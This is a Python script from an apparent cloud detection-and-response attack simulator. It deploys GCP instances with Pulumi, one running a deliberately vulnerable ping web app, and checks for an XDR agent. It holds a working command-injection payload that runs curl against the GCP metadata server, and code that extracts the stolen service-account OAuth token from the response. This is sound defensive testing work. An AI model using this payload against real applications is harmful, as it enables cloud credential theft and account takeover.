import os
import re
import subprocess
import json
import time
import urllib.parse
from time import sleep
from termcolor import colored
from core.helpers import loading_animation, generate_ssh_key

PULUMI_STACK_NAME = "cobra-scenario-9"
PULUMI_OUTPUT_JSON_PATH = "./core/cobra-scenario-9-output.json"
SSH_KEY_PATH = "./scenario_9_id_rsa"

CYTOOL_STATUS_CMD = "/opt/traps/bin/cytool status"
AGENT_CHECK_INTERVAL = 60  # seconds between agent status checks
MAX_AGENT_WAIT_TIME = 60 * 10  # 10 minutes max wait

# GCP IMDS endpoint for fetching the service account access token
IMDS_TOKEN_URL = (
    "http://metadata.google.internal/computeMetadata/v1/"
    "instance/service-accounts/default/token"
)

# Command injection payload: the semicolon terminates the ping command and
# executes curl against the GCP Instance Metadata Service (IMDS) to retrieve
# the OAuth2 access token associated with the instance's service account.
IMDS_CMD_INJECTION_PAYLOAD = (
    "; curl -s -H 'Metadata-Flavor: Google' " + IMDS_TOKEN_URL
)


class ScenarioExecution:
    def __init__(self):
        self.instance_name = None
        self.instance_public_ip = None
        self.instance_id = None
        self.instance_zone = None
        self.service_account_email = None
        self.ssh_user = None
        self.web_app_url = None
        self.agent_included = False
        self.instance_2_name = None
        self.instance_2_public_ip = None
        self.instance_2_id = None
        self.instance_2_zone = None
        self.service_account_2_email = None

    def read_pulumi_config(self):
        """Read Pulumi stack outputs from the JSON file."""
        with open(PULUMI_OUTPUT_JSON_PATH, "r") as file:
            data = json.load(file)

        self.instance_name = data["Instance Name"]
        self.instance_public_ip = data["Instance Public IP"]
        self.instance_id = data["Instance ID"]
        self.instance_zone = data["Instance Zone"]
        self.service_account_email = data["Service Account Email"]
        self.ssh_user = data["SSH User"]
        self.web_app_url = data["Web App URL"]
        self.agent_included = data.get("Agent Included", False)
        self.instance_2_name = data["Instance 2 Name"]
        self.instance_2_public_ip = data["Instance 2 Public IP"]
        self.instance_2_id = data["Instance 2 ID"]
        self.instance_2_zone = data["Instance 2 Zone"]
        self.service_account_2_email = data["Service Account 2 Email"]

    def init_infra(self):
        """Generate SSH keys and deploy Pulumi infrastructure."""
        if not os.path.exists(SSH_KEY_PATH):
            generate_ssh_key(SSH_KEY_PATH)
        else:
            print(colored(f"SSH key already exists at '{SSH_KEY_PATH}', reusing.", color="yellow"))

        if os.path.exists(PULUMI_OUTPUT_JSON_PATH):
            os.remove(PULUMI_OUTPUT_JSON_PATH)
            print("File '{}' found and deleted.".format(PULUMI_OUTPUT_JSON_PATH))
        else:
            print("File '{}' not found.".format(PULUMI_OUTPUT_JSON_PATH))

        subprocess.call(
            f"cd ./scenarios/scenario_9/infra/ && pulumi up -s {PULUMI_STACK_NAME} -y",
            shell=True,
        )
        subprocess.call(
            f"cd ./scenarios/scenario_9/infra/ && pulumi stack -s {PULUMI_STACK_NAME} output --json >> ../../../{PULUMI_OUTPUT_JSON_PATH}",
            shell=True,
        )

    def _wait_for_single_instance_running(self, instance_name, instance_zone):
        """Poll a single GCP compute instance status until it reaches RUNNING state."""
        print(colored(f"Waiting for instance '{instance_name}' to reach RUNNING status...", color="yellow"))
        max_attempts = 30
        for attempt in range(1, max_attempts + 1):
            try:
                result = subprocess.run(
                    f"gcloud compute instances describe {instance_name} --zone={instance_zone} --format='value(status)'",
                    shell=True, capture_output=True, text=True,
                )
                status = result.stdout.strip()
                if status == "RUNNING":
                    print(colored(f"Instance '{instance_name}' is RUNNING.", color="green"))
                    return True
                print(colored(f"  [{instance_name}] Attempt {attempt}/{max_attempts} - Current status: {status}", color="yellow"))
            except Exception as e:
                print(colored(f"  [{instance_name}] Attempt {attempt}/{max_attempts} - Error checking status: {e}", color="yellow"))
            sleep(10)
        print(colored(f"Instance '{instance_name}' did not reach RUNNING status after {max_attempts} attempts.", color="red"))
        return False

    def wait_for_instance_running(self):
        """Poll both GCP compute instances until they reach RUNNING state."""
        result_1 = self._wait_for_single_instance_running(self.instance_name, self.instance_zone)
        result_2 = self._wait_for_single_instance_running(self.instance_2_name, self.instance_2_zone)
        return result_1 and result_2

    def _check_single_agent_connected(self, instance_ip):
        """Check if the Cortex XDR agent EDR is enabled on a remote instance via SSH."""
        cmdline = (
            f"ssh -o StrictHostKeyChecking=no -i {SSH_KEY_PATH} "
            f"{self.ssh_user}@{instance_ip} 'sudo {CYTOOL_STATUS_CMD}'"
        )
        try:
            result = subprocess.run(cmdline, shell=True, capture_output=True, text=True)
            output = result.stdout
            edr_match = re.search(r"\nEDR\s+\w+\s+(\w+)\s+", output)
            if edr_match:
                return edr_match.group(1) == "Enabled"
        except Exception as e:
            print(colored(f"  Agent check error on {instance_ip}: {e}", color="yellow"))
        return False

    def check_agent_connected(self):
        """Check if the Cortex XDR agent EDR is enabled on both instances."""
        result_1 = self._check_single_agent_connected(self.instance_public_ip)
        result_2 = self._check_single_agent_connected(self.instance_2_public_ip)
        return result_1 and result_2

    def _wait_for_single_agent(self, instance_name, instance_ip):
        """Wait for the Cortex XDR agent EDR to become enabled on a single instance."""
        print(colored(f"Waiting for Cortex XDR agent EDR to be enabled on '{instance_name}'...", color="yellow"))
        time_waited = 0

        while True:
            if self._check_single_agent_connected(instance_ip):
                print(colored(f"Cortex XDR agent EDR enabled on '{instance_name}'!", color="green"))
                return True

            if time_waited >= MAX_AGENT_WAIT_TIME:
                print(colored(
                    f"Agent EDR on '{instance_name}' did not start within the timeout period. "
                    "The scenario will continue, but the agent may not be active.",
                    color="red",
                ))
                return False

            print(colored(
                f"  [{instance_name}] Agent not ready yet, retrying in {AGENT_CHECK_INTERVAL}s "
                f"(waited {time_waited}s / {MAX_AGENT_WAIT_TIME}s)...",
                color="yellow",
            ))
            time.sleep(AGENT_CHECK_INTERVAL)
            time_waited += AGENT_CHECK_INTERVAL

    def wait_for_agent(self):
        """Wait for the Cortex XDR agent EDR to become enabled on both instances."""
        result_1 = self._wait_for_single_agent(self.instance_name, self.instance_public_ip)
        result_2 = self._wait_for_single_agent(self.instance_2_name, self.instance_2_public_ip)
        return result_1 and result_2

    def scenario_9_execute(self, manual):
        """Deploy infrastructure and optionally run the attack simulation.

        When ``--manual`` is passed, only the infrastructure is deployed.
        The attack simulation can then be triggered separately via the
        ``post-launch`` action.
        """
        print("-" * 30)
        print(colored(
            "Executing Scenario 9 : GCP Cloud Detection and Response - Attack Simulation on GCP Environment",
            color="red",
        ))
        loading_animation()
        print("-" * 30)

        print(colored(
            "Please make sure that this scenario's Pulumi.yaml is properly configured for your specific environment.",
            "yellow",
        ))

        input("Press enter to continue...")

        print(colored("Rolling out Infra", color="red"))
        loading_animation()
        print("-" * 30)

        self.init_infra()

        print("-" * 30)
        print(colored("Infrastructure deployed successfully", color="green"))
        loading_animation()

        if manual:
            print(colored(
                "Using manual mode - use 'post-launch' to start the attack simulation",
                "yellow",
            ))
        else:
            self.post_execution()

    def post_execution(self):
        """Run the attack simulation against the already-deployed infrastructure."""
        print(colored("Starting attack simulation...", "cyan"))
        self.read_pulumi_config()

        print("-" * 30)
        print(colored("--- Instance 1 (Web App) ---", color="cyan"))
        print(colored(f"Instance Name: {self.instance_name}", color="cyan"))
        print(colored(f"Instance Public IP: {self.instance_public_ip}", color="cyan"))
        print(colored(f"Instance ID: {self.instance_id}", color="cyan"))
        print(colored(f"Instance Zone: {self.instance_zone}", color="cyan"))
        print(colored(f"Service Account: {self.service_account_email}", color="cyan"))
        print(colored(f"Web App URL: {self.web_app_url}", color="cyan"))
        print(colored(f"Agent Included: {self.agent_included}", color="cyan"))
        print(colored("--- Instance 2 (Plain) ---", color="cyan"))
        print(colored(f"Instance 2 Name: {self.instance_2_name}", color="cyan"))
        print(colored(f"Instance 2 Public IP: {self.instance_2_public_ip}", color="cyan"))
        print(colored(f"Instance 2 ID: {self.instance_2_id}", color="cyan"))
        print(colored(f"Instance 2 Zone: {self.instance_2_zone}", color="cyan"))
        print(colored(f"Service Account 2: {self.service_account_2_email}", color="cyan"))
        print("-" * 30)

        self.wait_for_instance_running()

        # If agent is included, wait for it to become active
        if self.agent_included:
            print("-" * 30)
            print(colored("Cortex XDR agent was included — waiting for agent to initialize...", color="yellow"))
            # Give the startup script time to download and install the agent
            print(colored("Waiting 60s for startup script to complete agent installation...", color="yellow"))
            time.sleep(60)
            self.wait_for_agent()
        else:
            print(colored("Agent not included in this deployment.", color="yellow"))

        print("-" * 30)
        print(colored("GCP Compute Instances are ready for attack simulation", color="green"))
        print("-" * 30)

        # ------------------------------------------------------------------
        # Payload 1 – Command injection to steal IMDS token from Instance 1
        # ------------------------------------------------------------------
        self._execute_imds_token_theft()

    # ------------------------------------------------------------------
    # Payload helpers
    # ------------------------------------------------------------------

    def _execute_imds_token_theft(self):
        """Exploit the vulnerable ping web app to steal the GCP IMDS token.

        Sends a crafted request to the ``/ping`` endpoint on Instance 1.
        The ``address`` parameter contains a command injection payload that
        terminates the ``ping`` command and runs ``curl`` against the GCP
        Instance Metadata Service to retrieve the service account OAuth2
        access token.
        """
        print(colored(
            "Payload 1: Command injection → IMDS token theft on Instance 1",
            color="red",
        ))
        loading_animation()

        # URL-encode the injection payload so it travels safely in the
        # query-string while still being interpreted by the shell on the
        # server side.
        encoded_payload = urllib.parse.quote(IMDS_CMD_INJECTION_PAYLOAD)
        target_url = f"{self.web_app_url}{encoded_payload}"

        print(colored(f"Target URL: {target_url}", color="yellow"))
        print(colored("Sending command injection payload...", color="yellow"))

        try:
            result = subprocess.run(
                ["curl", "-s", target_url],
                capture_output=True,
                text=True,
                timeout=30,
            )

            if result.returncode != 0:
                print(colored(f"curl failed (rc={result.returncode}): {result.stderr}", color="red"))
                return

            print(colored("Response from vulnerable web app:", color="green"))
            print("-" * 30)

            # Try to parse the web-app JSON response and extract the
            # embedded IMDS token from the stdout field.
            try:
                response_json = json.loads(result.stdout)
                print(colored(f"Command executed: {response_json.get('command', 'N/A')}", color="cyan"))
                stdout_output = response_json.get("stdout", "")
                stderr_output = response_json.get("stderr", "")

                if stdout_output:
                    print(colored("stdout:", color="cyan"))
                    print(stdout_output)

                if stderr_output:
                    print(colored("stderr:", color="yellow"))
                    print(stderr_output)

                # The IMDS token JSON is embedded in the stdout after the
                # ping output.  Try to extract it.
                token_data = self._extract_imds_token(stdout_output)
                if token_data:
                    print("-" * 30)
                    print(colored("IMDS Token successfully stolen from Instance 1!", color="red"))
                    print(colored(f"Access Token: {token_data.get('access_token', 'N/A')[:20]}...", color="red"))
                    print(colored(f"Token Type: {token_data.get('token_type', 'N/A')}", color="red"))
                    print(colored(f"Expires In: {token_data.get('expires_in', 'N/A')}s", color="red"))
                else:
                    print(colored(
                        "Could not extract IMDS token from response. "
                        "The instance may not have reached the metadata server yet.",
                        color="yellow",
                    ))
            except json.JSONDecodeError:
                # If the response isn't valid JSON, print it raw
                print(result.stdout)

            print("-" * 30)

        except subprocess.TimeoutExpired:
            print(colored("Request timed out after 30s", color="red"))
        except Exception as e:
            print(colored(f"Error executing payload: {e}", color="red"))

    @staticmethod
    def _extract_imds_token(stdout_output):
        """Extract the IMDS token JSON from the command injection output.

        The ``stdout`` field returned by the vulnerable ping app contains
        the normal ``ping`` output followed by the raw JSON returned by the
        GCP metadata server.  This helper scans for the JSON object and
        parses it.

        Args:
            stdout_output: The ``stdout`` string from the web-app response.

        Returns:
            A dict with the token fields (``access_token``, ``token_type``,
            ``expires_in``) or ``None`` if extraction fails.
        """
        # Look for a JSON object containing "access_token" in the output
        match = re.search(r'\{[^{}]*"access_token"[^{}]*\}', stdout_output)
        if match:
            try:
                return json.loads(match.group(0))
            except json.JSONDecodeError:
                pass
        return None

    def scenario_9_destroy(self):
        """Destroy the Pulumi infrastructure for scenario 9."""
        print(colored("Destroying infrastructure...", "yellow"))
        subprocess.call(
            f"cd ./scenarios/scenario_9/infra && pulumi destroy -s {PULUMI_STACK_NAME} --yes",
            shell=True,
        )
